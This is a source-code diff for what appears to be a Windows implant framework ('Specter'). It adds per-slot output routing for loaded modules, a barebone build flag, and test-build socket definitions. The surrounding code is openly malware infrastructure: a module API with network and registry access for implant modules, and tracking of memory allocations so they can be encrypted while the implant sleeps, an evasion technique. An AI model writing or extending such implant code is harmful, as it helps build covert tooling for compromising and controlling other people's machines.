@@ -15,6 +15,20 @@
 #include "peb.h"
 #include "sleep.h"
 
+#ifdef TEST_BUILD
+#ifndef AF_INET
+#define AF_INET         2
+#define SOCK_STREAM    1
+#define IPPROTO_TCP    6
+#define SOCKET_ERROR   (-1)
+#define INVALID_SOCKET ((ULONG_PTR)(~(ULONG_PTR)0))
+typedef struct _SOCKADDR {
+    WORD sa_family;
+    char sa_data[14];
+} SOCKADDR;
+#endif
+#endif
+
 /* ------------------------------------------------------------------ */
 /*  Static bus context storage                                         */
 /* ------------------------------------------------------------------ */
@@ -59,6 +73,14 @@ static BOOL      bus_reg_write(DWORD hive, const char *path, const char *value,
 static BOOL      bus_reg_delete(DWORD hive, const char *path, const char *value);
 
 static BOOL      bus_output(const BYTE *data, DWORD len, DWORD type);
+static BOOL      bus_output_slot0(const BYTE *data, DWORD len, DWORD type);
+static BOOL      bus_output_slot1(const BYTE *data, DWORD len, DWORD type);
+static BOOL      bus_output_slot2(const BYTE *data, DWORD len, DWORD type);
+static BOOL      bus_output_slot3(const BYTE *data, DWORD len, DWORD type);
+static BOOL      bus_output_slot4(const BYTE *data, DWORD len, DWORD type);
+static BOOL      bus_output_slot5(const BYTE *data, DWORD len, DWORD type);
+static BOOL      bus_output_slot6(const BYTE *data, DWORD len, DWORD type);
+static BOOL      bus_output_slot7(const BYTE *data, DWORD len, DWORD type);
 static PVOID     bus_resolve(const char *dll_name, const char *func_name);
 static void      bus_log(DWORD level, const char *msg);
 
@@ -250,6 +272,7 @@ NTSTATUS bus_init(IMPLANT_CONTEXT *ctx) {
     api->mem_free           = bus_mem_free;
     api->mem_protect        = bus_mem_protect;
 
+#ifndef SPECTER_BAREBONE_MODULES
     api->net_connect        = bus_net_connect;
     api->net_send           = bus_net_send;
     api->net_recv           = bus_net_recv;
@@ -277,6 +300,7 @@ NTSTATUS bus_init(IMPLANT_CONTEXT *ctx) {
     api->reg_read           = bus_reg_read;
     api->reg_write          = bus_reg_write;
     api->reg_delete         = bus_reg_delete;
+#endif
 
     api->output             = bus_output;
     api->resolve            = bus_resolve;
@@ -298,6 +322,24 @@ MODULE_BUS_API *bus_get_api(BUS_CONTEXT *bctx) {
     return &bctx->api;
 }
 
+void bus_prepare_slot_api(MODULE_BUS_API *api, DWORD slot_idx) {
+    if (!api)
+        return;
+
+    spec_memcpy(api, &g_bus_ctx.api, sizeof(MODULE_BUS_API));
+    switch (slot_idx) {
+    case 0: api->output = bus_output_slot0; break;
+    case 1: api->output = bus_output_slot1; break;
+    case 2: api->output = bus_output_slot2; break;
+    case 3: api->output = bus_output_slot3; break;
+    case 4: api->output = bus_output_slot4; break;
+    case 5: api->output = bus_output_slot5; break;
+    case 6: api->output = bus_output_slot6; break;
+    case 7: api->output = bus_output_slot7; break;
+    default: api->output = bus_output; break;
+    }
+}
+
 /* ------------------------------------------------------------------ */
 /*  Memory API implementations                                         */
 /* ------------------------------------------------------------------ */
@@ -315,10 +357,12 @@ static PVOID bus_mem_alloc(SIZE_T size, DWORD perms) {
     if (!NT_SUCCESS(status))
         return NULL;
 
+#ifndef SPECTER_BAREBONE_MODULES
     /* Track allocation for sleep-time encryption */
     IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
     if (ctx && ctx->sleep_ctx)
         sleep_track_alloc((SLEEP_CONTEXT *)ctx->sleep_ctx, base, alloc_size);
+#endif
 
     return base;
 }
@@ -327,10 +371,12 @@ static BOOL bus_mem_free(PVOID ptr) {
     if (!ptr)
         return FALSE;
 
+#ifndef SPECTER_BAREBONE_MODULES
     /* Untrack from sleep heap list */
     IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)g_bus_ctx.implant_ctx;
     if (ctx && ctx->sleep_ctx)
         sleep_untrack_alloc((SLEEP_CONTEXT *)ctx->sleep_ctx, ptr);
+#endif
 
     SIZE_T size = 0;
     HANDLE process = (HANDLE)-1;
@@ -1223,7 +1269,53 @@ static BOOL bus_reg_delete(DWORD hive, const char *path, const char *value) {
 /* ------------------------------------------------------------------ */
 
 static BOOL bus_output(const BYTE *data, DWORD len, DWORD type) {
-    return output_write(&g_bus_ctx.output_ring, data, len, type);
+    BOOL ok = output_write(&g_bus_ctx.output_ring, data, len, type);
+    return ok;
+}
+
+static BOOL bus_output_to_slot(DWORD slot_idx, const BYTE *data, DWORD len, DWORD type) {
+#ifdef TEST_BUILD
+    (void)slot_idx;
+    return bus_output(data, len, type);
+#else
+    MODULE_MANAGER *mgr = modmgr_get();
+    if (!mgr || !mgr->initialized || slot_idx >= MODMGR_MAX_SLOTS)
+        return bus_output(data, len, type);
+
+    return output_write(&mgr->output_rings[slot_idx], data, len, type);
+#endif
+}
+
+static BOOL bus_output_slot0(const BYTE *data, DWORD len, DWORD type) {
+    return bus_output_to_slot(0, data, len, type);
+}
+
+static BOOL bus_output_slot1(const BYTE *data, DWORD len, DWORD type) {
+    return bus_output_to_slot(1, data, len, type);
+}
+
+static BOOL bus_output_slot2(const BYTE *data, DWORD len, DWORD type) {
+    return bus_output_to_slot(2, data, len, type);
+}
+
+static BOOL bus_output_slot3(const BYTE *data, DWORD len, DWORD type) {
+    return bus_output_to_slot(3, data, len, type);
+}
+
+static BOOL bus_output_slot4(const BYTE *data, DWORD len, DWORD type) {
+    return bus_output_to_slot(4, data, len, type);
+}
+
+static BOOL bus_output_slot5(const BYTE *data, DWORD len, DWORD type) {
+    return bus_output_to_slot(5, data, len, type);
+}
+
+static BOOL bus_output_slot6(const BYTE *data, DWORD len, DWORD type) {
+    return bus_output_to_slot(6, data, len, type);
+}
+
+static BOOL bus_output_slot7(const BYTE *data, DWORD len, DWORD type) {
+    return bus_output_to_slot(7, data, len, type);
 }
 
 /* ------------------------------------------------------------------ */
